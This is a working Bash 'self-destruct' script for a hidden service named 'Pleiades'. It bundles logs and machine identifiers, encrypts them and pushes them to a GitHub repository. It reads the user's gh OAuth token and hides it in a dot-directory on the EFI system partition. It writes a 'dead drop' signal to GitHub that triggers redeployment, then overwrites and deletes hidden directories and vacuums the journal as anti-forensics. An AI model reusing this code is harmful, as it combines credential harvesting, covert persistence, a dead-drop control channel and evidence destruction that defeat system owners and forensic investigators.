#!/bin/bash
# pleiades-selfdestruct.sh — Evidence-preserving self-destruct + auto-redeploy trigger
#
# Sequence:
#   1. Collect evidence bundle (logs, keys, telemetry, captures)
#   2. Push bundle to private GitHub evidence repo (Zheke32174/pleiades-evidence)
#   3. Store auth credentials in ESP (FAT32 filesystem, not firmware vars)
#   4. Write redeploy signal to GitHub dead drop (Zheke32174/pleiades dead_drop/signal.json)
#   5. Wipe local traces (logs, state dirs, keys, temp files)
#   6. Optionally trigger nspawn container shutdown
#
# Redeploy path (used by rehydrate.sh after boot):
#   gh repo clone Zheke32174/pleiades → re-run bootstrap → container comes back up
#
# Usage:
#   pleiades-selfdestruct.sh [--wipe-only] [--no-push] [--redeploy] [--dry-run]

set -euo pipefail

# ------------------------------------------------------------
# Config
# ------------------------------------------------------------
EVIDENCE_REPO="Zheke32174/pleiades-evidence"
PLEIADES_REPO="Zheke32174/pleiades"
DEAD_DROP_FILE="dead_drop/signal.json"
MAIA_DIR="/var/lib/.maia"
WORK_DIR="/tmp/_pleiades_sd_$$"
BUNDLE_DIR="$WORK_DIR/evidence"
LOG_TAG="pleiades-selfdestruct"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BUNDLE_ARCHIVE="$WORK_DIR/evidence_${TIMESTAMP}.tar.gz.enc"

# Directories to wipe
WIPE_DIRS=(
    "/var/lib/.maia/logs"
    "/var/lib/.maia/work"
    "/var/lib/.lich"
    "/var/lib/.electra"
    "/run/pleiades"
    "/tmp/_maia_*"
    "/etc/imtherealsparticus"
)

# Files to preserve in evidence
EVIDENCE_SOURCES=(
    "/var/lib/.maia/logs"
    "/var/log/pleiades-*.log"
    "/var/log/pleiades-regression*"
    "/run/pleiades-host-capsule/process-alerts.jsonl"
    "/var/lib/.maia/state.json"
    "/etc/imtherealsparticus/ssh_honeypot.log"
)

# Parse flags
WIPE_ONLY=false
NO_PUSH=false
DO_REDEPLOY=false
DRY_RUN=false
for arg in "$@"; do
    [[ "$arg" == "--wipe-only" ]]  && WIPE_ONLY=true
    [[ "$arg" == "--no-push" ]]    && NO_PUSH=true
    [[ "$arg" == "--redeploy" ]]   && DO_REDEPLOY=true
    [[ "$arg" == "--dry-run" ]]    && DRY_RUN=true
done

log()  { logger -t "$LOG_TAG" "$*" 2>/dev/null; echo "[$LOG_TAG] $*"; }
run()  { if $DRY_RUN; then echo "[DRY-RUN] $*"; else "$@"; fi; }
die()  { echo "ERROR: $*" >&2; exit 1; }

[[ "${EUID:-$(id -u)}" -ne 0 ]] && die "Must run as root"

# ------------------------------------------------------------
# Stage 1: Collect evidence
# ------------------------------------------------------------
collect_evidence() {
    log "Stage 1: Collecting evidence..."
    run mkdir -p "$BUNDLE_DIR"

    local collected=0
    for src in "${EVIDENCE_SOURCES[@]}"; do
        for f in $src; do
            [[ -e "$f" ]] || continue
            run cp -rp "$f" "$BUNDLE_DIR/" 2>/dev/null || true
            (( collected++ )) || true
        done
    done

    # Add system metadata
    if ! $DRY_RUN; then
        {
            echo "timestamp: $TIMESTAMP"
            echo "hostname: $(hostname)"
            echo "machine_id: $(cat /etc/machine-id 2>/dev/null)"
            echo "env: $(grep -qi microsoft /proc/version 2>/dev/null && echo wsl || echo bare_metal)"
            echo "uptime: $(uptime)"
            echo "collected_files: $collected"
        } > "$BUNDLE_DIR/metadata.txt"
    fi

    log "Collected $collected evidence items"
}

# ------------------------------------------------------------
# Stage 2: Encrypt bundle
# ------------------------------------------------------------
encrypt_bundle() {
    log "Stage 2: Encrypting evidence bundle..."

    if ! $DRY_RUN; then
        # Derive key from machine identity (same derivation as Maia.sh)
        local machine_id; machine_id=$(cat /etc/machine-id 2>/dev/null || echo "unknown")
        local hostname; hostname=$(hostname)
        local mac; mac=$(ip link 2>/dev/null | awk '/ether/{print $2; exit}' | tr -d ':')
        local key_material; key_material=$(printf '%s%s%s' "$machine_id" "$hostname" "$mac" | sha256sum | awk '{print $1}')

        tar czf - -C "$BUNDLE_DIR" . | \
            openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$key_material" -out "$BUNDLE_ARCHIVE" 2>/dev/null
        log "Bundle encrypted: $BUNDLE_ARCHIVE ($(du -sh "$BUNDLE_ARCHIVE" 2>/dev/null | cut -f1))"
    else
        log "[DRY-RUN] Would encrypt $BUNDLE_DIR → $BUNDLE_ARCHIVE"
    fi
}

# ------------------------------------------------------------
# Stage 3: Push to private evidence repo
# ------------------------------------------------------------
push_evidence() {
    [[ "$NO_PUSH" == "true" ]] && { log "Stage 3: Skipped (--no-push)"; return; }
    log "Stage 3: Pushing evidence to $EVIDENCE_REPO..."

    if ! command -v gh &>/dev/null; then
        log "WARN: gh CLI not available — evidence push skipped"
        return
    fi

    if ! $DRY_RUN; then
        local push_dir="$WORK_DIR/evidence_push"
        mkdir -p "$push_dir"
        cd "$push_dir"

        # Init a throw-away git repo and push via gh
        git init -q
        git config user.email "pleiades@localhost"
        git config user.name "Pleiades Auto"
        cp "$BUNDLE_ARCHIVE" ./
        git add -A
        git commit -m "evidence: $TIMESTAMP from $(hostname)" -q

        # Push to evidence repo (create branch named by timestamp)
        local branch="evidence/${TIMESTAMP}"
        if gh repo view "$EVIDENCE_REPO" &>/dev/null; then
            git remote add origin "https://github.com/${EVIDENCE_REPO}.git"
            gh auth status -h github.com &>/dev/null && \
                git push origin "HEAD:${branch}" 2>/dev/null && \
                log "Evidence pushed to $EVIDENCE_REPO branch $branch" || \
                log "WARN: git push failed — evidence stays local at $BUNDLE_ARCHIVE"
        else
            log "WARN: Evidence repo $EVIDENCE_REPO not accessible"
        fi
        cd /
    fi
}

# ------------------------------------------------------------
# Stage 4: Store auth credentials in ESP (FAT32 only)
# ------------------------------------------------------------
persist_auth_to_esp() {
    log "Stage 4: Persisting auth credentials to ESP..."

    local esp=""
    # Check mounted ESP paths first
    for mp in /boot/efi /boot/EFI /efi /boot; do
        [[ -d "$mp/EFI" ]] && mountpoint -q "$mp" 2>/dev/null && { esp="$mp"; break; }
    done

    # WSL: find ESP via PowerShell
    if [[ -z "$esp" ]] && grep -qi microsoft /proc/version 2>/dev/null && command -v powershell.exe &>/dev/null; then
        local win_esp
        win_esp=$(powershell.exe -NoProfile -Command "
            \$d = Get-Partition | Where-Object { \$_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}' } |
                Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter
            if (\$d) { Write-Output \"\${d}:\" }
        " 2>/dev/null | tr -d '\r\n ')
        [[ -n "$win_esp" ]] && {
            local wsl_path="/mnt/${win_esp,,}"
            [[ -d "$wsl_path/EFI" ]] && esp="$wsl_path"
        }
    fi

    # Bare metal: find by PARTTYPE GUID
    if [[ -z "$esp" ]]; then
        local esp_dev
        esp_dev=$(lsblk --output NAME,PARTTYPE --pairs --noheadings 2>/dev/null | \
            grep -i 'c12a7328-f81f-11d2-ba4b-00a0c93ec93b' | \
            awk -F'"' '{print $2}' | head -1)
        if [[ -n "$esp_dev" ]] && [[ -b "/dev/$esp_dev" ]]; then
            esp="/tmp/_pleiades_esp_$$"
            mkdir -p "$esp"
            mount "/dev/$esp_dev" "$esp" 2>/dev/null || { rm -rf "$esp"; esp=""; }
        fi
    fi

    if [[ -z "$esp" ]]; then
        log "WARN: No ESP found — auth credentials not persisted to EFI"
        return
    fi

    if ! $DRY_RUN; then
        local cred_dir="$esp/EFI/.pleiades"
        mkdir -p "$cred_dir"

        # Store gh token (if available)
        local gh_token
        gh_token=$(gh auth token 2>/dev/null || cat "$HOME/.config/gh/hosts.yml" 2>/dev/null | \
            grep -A1 'oauth_token' | tail -1 | tr -d ' ') || true
        if [[ -n "$gh_token" ]]; then
            printf '%s' "$gh_token" | \
                openssl enc -aes-256-cbc -pbkdf2 -pass env:HOSTNAME -out "$cred_dir/gh.tok.enc" 2>/dev/null
            log "gh token persisted to ESP: $cred_dir/gh.tok.enc"
        fi

        # Store machine key fingerprint for future decryption
        printf '%s' "$(cat /etc/machine-id 2>/dev/null)$(hostname)" | \
            sha256sum | awk '{print $1}' > "$cred_dir/machine.key.fp"

        log "Auth credentials persisted to ESP: $cred_dir"
    fi
}

# ------------------------------------------------------------
# Stage 5: Write dead drop signal (triggers rehydration)
# ------------------------------------------------------------
write_dead_drop() {
    [[ "$DO_REDEPLOY" != "true" ]] && { log "Stage 5: Redeploy signal skipped (pass --redeploy to trigger)"; return; }
    log "Stage 5: Writing rehydration signal to dead drop..."

    if ! command -v gh &>/dev/null; then
        log "WARN: gh CLI not available — dead drop write skipped"
        return
    fi

    if ! $DRY_RUN; then
        local signal
        signal=$(printf '{"action":"redeploy","ts":%d,"target":"container","from":"%s"}' \
            "$(date +%s)" "$(hostname)")

        # Write signal.json to the pleiades repo via gh api
        local encoded; encoded=$(printf '%s' "$signal" | base64 -w0)
        local current_sha
        current_sha=$(gh api "repos/${PLEIADES_REPO}/contents/${DEAD_DROP_FILE}" \
            --jq '.sha' 2>/dev/null || echo "")

        if [[ -n "$current_sha" ]]; then
            gh api "repos/${PLEIADES_REPO}/contents/${DEAD_DROP_FILE}" \
                --method PUT \
                --field message="signal: redeploy from $(hostname) at $TIMESTAMP" \
                --field content="$encoded" \
                --field sha="$current_sha" \
                --silent && log "Dead drop signal written to $PLEIADES_REPO/$DEAD_DROP_FILE"
        else
            gh api "repos/${PLEIADES_REPO}/contents/${DEAD_DROP_FILE}" \
                --method PUT \
                --field message="signal: redeploy from $(hostname) at $TIMESTAMP" \
                --field content="$encoded" \
                --silent && log "Dead drop signal created at $PLEIADES_REPO/$DEAD_DROP_FILE"
        fi
    fi
}

# ------------------------------------------------------------
# Stage 6: Wipe local traces
# ------------------------------------------------------------
wipe_traces() {
    log "Stage 6: Wiping local traces..."
    local wiped=0

    for target in "${WIPE_DIRS[@]}"; do
        for f in $target; do
            [[ -e "$f" ]] || continue
            if $DRY_RUN; then
                echo "[DRY-RUN] Would wipe: $f"
            else
                # Overwrite before delete (basic anti-forensics)
                if [[ -f "$f" ]]; then
                    dd if=/dev/urandom of="$f" bs=4096 count=1 2>/dev/null || true
                    rm -f "$f"
                elif [[ -d "$f" ]]; then
                    find "$f" -type f -exec sh -c 'dd if=/dev/urandom of="$1" bs=4096 count=1 2>/dev/null; rm -f "$1"' _ {} \; 2>/dev/null || true
                    rm -rf "$f"
                fi
                (( wiped++ )) || true
            fi
        done
    done

    # Clear systemd journal for this unit
    run journalctl --vacuum-time=1s --unit=machine-runtime-monitor 2>/dev/null || true

    log "Wiped $wiped targets"
}

# ------------------------------------------------------------
# Stage 7: Stop container (optional)
# ------------------------------------------------------------
stop_container() {
    if systemctl is-active machine-runtime-monitor &>/dev/null; then
        log "Stopping machine-runtime-monitor service..."
        # Remove immutability first (owner action)
        chattr -i /usr/local/sbin/machine-runtime-monitor \
                  /etc/systemd/system/machine-runtime-monitor.service 2>/dev/null || true
        run systemctl stop machine-runtime-monitor || true
    fi
    if machinectl status pleiades &>/dev/null 2>&1; then
        run machinectl terminate pleiades || true
    fi
}

# ------------------------------------------------------------
# Cleanup temp work dir
# ------------------------------------------------------------
cleanup() {
    [[ -d "$WORK_DIR" ]] && rm -rf "$WORK_DIR"
}
trap cleanup EXIT

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
log "=== Pleiades Self-Destruct (dry_run=$DRY_RUN wipe_only=$WIPE_ONLY) ==="
run mkdir -p "$WORK_DIR"

if ! $WIPE_ONLY; then
    collect_evidence
    encrypt_bundle
    push_evidence
    persist_auth_to_esp
    write_dead_drop
fi

wipe_traces

if [[ "$DO_REDEPLOY" == "true" ]]; then
    stop_container
    log "Container stopped. Rehydration signal written. System will redeploy on next boot."
fi

log "=== Self-destruct complete ==="
log "Evidence archive: $BUNDLE_ARCHIVE (will be cleaned up on EXIT)"
log "To redeploy manually: gh repo clone Zheke32174/pleiades && bash pleiades/bootstrap.sh"
